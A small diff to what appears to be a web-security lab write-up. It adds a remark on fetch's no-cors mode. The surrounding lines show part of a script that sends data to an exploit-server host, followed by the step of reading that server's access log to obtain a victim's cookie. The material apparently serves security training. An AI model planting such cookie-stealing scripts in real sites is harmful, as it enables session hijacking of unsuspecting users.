@@ -177,6 +177,8 @@ fetch("https://exploit-0a32005c03b912ba817ca75001d90043.exploit-server.net/explo
 </script>
 ```
 
+(`mode: 'no-cors'` limits possible headers which will be added to the request and may not allow accessing the response value)
+
 Then read the `Access log` from the `Exploit server` to reveal the cookie.
 
 ```
